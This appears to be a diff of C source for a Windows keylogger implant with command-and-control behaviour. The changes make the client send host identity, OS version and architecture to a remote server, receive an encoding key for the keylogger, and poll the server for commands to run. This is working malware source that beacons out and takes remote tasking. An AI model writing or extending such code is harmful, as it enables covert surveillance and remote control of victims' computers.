@@ -3,6 +3,7 @@
 
 #include "client.h"
 
+
 /**
  * Initialises the client structure, retrieves the username and computername
  * of the client and stores it as their ID. Then generates two and internet and 
@@ -40,13 +41,14 @@ CLIENT_HANDLER* initClient() {
 
 
 /**
- * the internet session and connection handles are now in the client handler
- * We can then construct the  
+ * Retrieev all cleint registration information and sent it to the server. 
+ * The server responds with the random encoding key which is stored in the 
+ * key logger
  */
 ERR_CODE registerClient(CLIENT_HANDLER *client) {
-    // gets version information
-    OSVERSIONINFOA vInfo;
-    ZeroMemory(&vInfo, sizeof(OSVERSIONINFOA));
+    time_t seconds = getCurrentTime();
+
+    OSVERSIONINFOA vInfo =  { 0 };   // gets version information
     vInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
 
     char version[32];
@@ -56,8 +58,7 @@ ERR_CODE registerClient(CLIENT_HANDLER *client) {
         sprintf(version, "WIN-%ld.%ld", vInfo.dwMajorVersion, vInfo.dwMinorVersion);
     }
 
-    // get architecture information
-    SYSTEM_INFO sInfo;
+    SYSTEM_INFO sInfo;   // get architecture information
     GetSystemInfo(&sInfo);
 
     char* arch = "UNKNOWN";   // PROCESSOR_ARCHITECTURE_UNKNOWN
@@ -69,8 +70,6 @@ ERR_CODE registerClient(CLIENT_HANDLER *client) {
         case PROCESSOR_ARCHITECTURE_INTEL: arch = "x86"; break;
     }
 
-    time_t seconds = getCurrentTime();
-
     // send the register data that includes system infomation!
     char registerStr[MAX_MSG_LEN];
     snprintf(registerStr, MAX_MSG_LEN, "/register?id=%s&os=%s&arch=%s&time=%lld", client->id, version, arch, seconds);
@@ -79,7 +78,20 @@ ERR_CODE registerClient(CLIENT_HANDLER *client) {
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", registerStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
     if (hRequest == NULL) { return ECODE_NULL; }
 
-    HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0);
+    // send the register request
+    if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
+        InternetCloseHandle(hRequest);
+        return ECODE_GET;
+    }
+
+    DWORD bytesRead;  // read the key from the response
+    unsigned char key[2];
+    if (!InternetReadFile(hRequest, key, 1, &bytesRead) && bytesRead != 0) {  
+        return ECODE_GET;
+    }
+    client->ENC_KEY = key[0];
+    printf("\nSECRET: '%02X'\n", client->ENC_KEY);
+
     InternetCloseHandle(hRequest);
     return ECODE_SUCCESS;
 }
@@ -105,9 +117,10 @@ ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
 
     // read the commands into the command buffer!
     DWORD bytesRead;
-    while (InternetReadFile(hRequest, client->cmdBuffer, MAX_BUFF_LEN - 1, &bytesRead) && bytesRead != 0) {
-        client->cmdBuffer[bytesRead] = '\0';
+    if (!InternetReadFile(hRequest, client->cmdBuffer, MAX_BUFF_LEN - 1, &bytesRead)) {
+        return ECODE_GET;
     }
+    client->cmdBuffer[bytesRead] = '\0';
 
     InternetCloseHandle(hRequest);
     return ECODE_SUCCESS;
